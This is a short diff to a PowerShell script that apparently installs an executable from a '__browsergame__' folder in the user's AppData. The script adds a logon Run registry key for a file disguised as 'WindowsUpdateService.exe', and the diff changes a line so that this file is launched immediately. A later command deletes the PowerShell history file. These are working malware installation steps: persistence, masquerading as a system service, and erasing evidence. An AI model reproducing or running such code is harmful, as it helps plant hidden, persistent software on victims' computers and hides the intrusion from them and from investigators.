@@ -27,7 +27,7 @@ Expand-Archive -Path "C:/Users/$env:USERNAME/AppData/Roaming/__browsergame__/v2.
 
 # Command 7
 New-ItemProperty -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Run -Name "start" -Value "C:\Users\$env:USERNAME\AppData\Roaming\__browsergame__\WindowsUpdateService-main\WindowsUpdateService.exe" -PropertyType String
-"C:/Users/$env:USERNAME/AppData/Roaming/__browsergame__/WindowsUpdateService-main/WindowsUpdateService.exe"
+start "C:/Users/$env:USERNAME/AppData/Roaming/__browsergame__/WindowsUpdateService-main/WindowsUpdateService.exe"
 
 # Command 8
 Remove-Item (Get-PSReadlineOption).HistorySavePath
